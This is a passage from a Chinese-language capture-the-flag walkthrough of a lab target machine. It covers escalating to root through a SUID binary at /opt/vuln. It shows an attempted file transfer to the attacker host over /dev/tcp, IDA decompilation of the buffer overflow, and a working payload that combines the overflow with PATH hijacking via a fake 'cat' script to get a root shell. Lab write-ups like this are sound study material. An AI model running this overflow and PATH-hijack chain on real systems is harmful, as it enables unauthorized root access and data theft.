drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 ..
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:51 authorized_keys
-rw-------    1 ldz      ldz            399 Jun 24 20:43 id_ed25519
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:43 id_ed25519.pub
-rw-------    1 ldz      ldz            828 Jun 25 13:18 known_hosts
-rw-r--r--    1 ldz      ldz             92 Jun 25 13:18 known_hosts.old
localhost:~/.ssh$ ssh-keygen -l -f id_ed25519
256 SHA256:N14sJc5eu0fTD2oG9XrFil1dcsAbsSw3JjqW6vmwheg ldz@localhost (ED25519)
```

### 5.3 SUID提权与PATH劫持

找不到，看到vim的历史记录有修改过/opt/vuln去看看

```
localhost:~/.ssh$ cd /opt/
localhost:/opt$ ls -al
total 40
drwxr-xr-x    5 root     root          4096 Jun 25 01:42 .
drwxr-xr-x   21 root     root          4096 Jun 25 01:45 ..
drwx--x--x    4 root     root          4096 Jun 16 16:03 containerd
drw-------    2 root     root          4096 Jun 24 19:55 server
drw-------    3 root     root          4096 Jun 25 01:52 server2
-rwsr-xr-x    1 root     root         19968 Jun 25 01:33 vuln
localhost:/opt$ ./vuln 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag = 0
password wrong
```

有点像溢出，拖过来看看
老样子，kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lvnp 1234 > vuln     
listening on [any] 1234 ...

```

靶机推送

```
localhost:/opt$ cat vuln > /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
localhost:/opt$ which bash
```

ok，那没事了，拿scp推

```
localhost:/opt$ scp vuln kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
The authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.
ED25519 key fingerprint is SHA256:0EmnEbFZ1K2Otrqlk0b3OHH8M36kr43dnKXNZ9+mcLI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '192.168.205.128' (ED25519) to the list of known hosts.
kali@192.168.205.128's password: 
vuln                                                                                                                                            100%   20KB   8.9MB/s   00:00   
```

拖去ida

```
void __cdecl vuln()
{
  char buffer[32]; // [rsp+0h] [rbp-30h] BYREF
  ssize_t n; // [rsp+20h] [rbp-10h]
  int flag; // [rsp+2Ch] [rbp-4h]

  flag = 0;
  n = read(0, buffer, 0x30uLL);
  if ( flag == 1 )
  {
    secret();
  }
  else
  {
    printf("flag = %d\n", (unsigned int)flag);
    puts("password wrong");
  }
}

void __cdecl secret()
{
  setuid(0);
  system("cat /etc/shadow");
}
```

看来一下，确实是溢出
你想拿shell也可以，玩法挺多

```
localhost:/opt$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
localhost:/opt$ tty
/dev/pts/0
localhost:/opt$ cd /home/ldz
localhost:~$ echo "/bin/sh < /dev/pts/0" > cat
localhost:~$ chmod +x cat
localhost:~$ (printf 'A%.0s' $(seq 1 44); printf '\x01\x00\x00\x00') > p
localhost:~$ xxd p
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 0100 0000  AAAAAAAAAAAA....
localhost:~$ export PATH=/home/ldz:$PATH
localhost:~$ cd /opt
localhost:/opt$ ./vuln < /home/ldz/p
/opt # id
uid=0(root) gid=1000(ldz) groups=1000(ldz)
/opt # export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$HOME/bin
/opt # cat /root/root.txt 
flag{98ecb90d5dcef41e1bd18f47697f287a}
```

评价一下这个靶机
![image-20250628094814909](https://7r1umphk.github.io/image20250628094815151.webp)

哈哈，没打过的可以期待一手